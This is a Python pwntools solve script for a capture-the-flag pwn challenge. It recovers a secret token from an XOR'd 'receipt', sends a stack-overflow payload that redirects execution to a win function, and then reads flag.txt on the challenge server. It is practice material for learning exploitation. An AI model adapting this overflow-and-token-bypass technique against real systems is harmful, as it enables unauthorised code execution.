#!/usr/bin/env python3

from pathlib import Path
import re

from pwn import *

BASE_DIR = Path(__file__).resolve().parent
BINARY_PATH = BASE_DIR / "chal"

context.binary = elf = ELF(str(BINARY_PATH), checksec=False)
context.log_level = "info"

WIN = 0x401246
RET = 0x4010f0


def start():
    if args.REMOTE:
        host = args.HOST or "chal.thjcc.org"
        port = int(args.PORT or 11038)
        return remote(host, port, timeout=5)

    if args.GDB:
        return gdb.debug(
            [str(BINARY_PATH)],
            gdbscript="""
            set pagination off
            continue
            """,
        )

    return process([str(BINARY_PATH)])


def read_receipt(io):
    line = io.recvline_contains(b"receipt:")
    match = re.search(rb"receipt: 0x([0-9a-fA-F]{16})", line)
    if not match:
        raise ValueError(f"receipt tidak valid: {line!r}")
    return int(match.group(1), 16)


def exploit(io):
    io.recvuntil(b"leave a note:\n")

    # 7 karakter + NUL yang ditulis scanf menjadi note 8-byte.
    # Receipt = token XOR note, jadi token dapat dipulihkan.
    first_note = b"A" * 7
    io.sendline(first_note)
    receipt = read_receipt(io)
    token = receipt ^ u64(first_note + b"\x00")
    log.info("receipt = %#x", receipt)
    log.info("token   = %#x", token)

    io.recvuntil(b"leave another note:\n")
    payload = flat(
        b"B" * 8,
        p64(token),
        b"C" * 8,
        p64(RET),
        p64(WIN),
    )
    if any(byte == 0 for byte in p64(token)):
        raise ValueError("token mengandung NUL dan tidak cocok dengan scanf(%s)")
    io.sendline(payload)
    io.recvuntil(b"thanks!\n")


def main():
    io = start()
    exploit(io)
    io.sendline(b"cat flag.txt")
    output = io.recvrepeat(1.5)
    print(output.decode(errors="replace"), end="")
    io.close()


if __name__ == "__main__":
    main()
